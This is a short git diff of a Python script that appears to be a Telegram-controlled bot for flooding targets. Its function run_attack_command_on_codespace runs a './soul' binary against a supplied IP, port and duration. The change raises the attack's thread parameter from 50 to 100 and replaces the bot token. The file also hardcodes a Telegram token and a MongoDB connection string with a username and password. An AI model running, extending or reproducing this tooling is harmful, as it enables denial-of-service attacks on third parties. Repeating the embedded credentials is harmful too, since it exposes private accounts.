@@ -13,7 +13,7 @@ from threading import Thread
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7477846047:AAFdwBsVzyZ1N9QNea6C0gRn6MoJovBKkJY'
+TOKEN = '7477846047:AAGf5xYFyiPgQR5E8f6NKQZa0crJb-ywNqY'
 MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
 FORWARD_CHANNEL_ID = -1002403226371
 CHANNEL_ID = -1002403226371
@@ -35,7 +35,7 @@ running_processes = []
 
 REMOTE_HOST = '4.213.71.147'  
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./soul {target_ip} {target_port} {duration} 50"
+    command = f"./soul {target_ip} {target_port} {duration} 100"
     try:
        
         process = await asyncio.create_subprocess_shell(
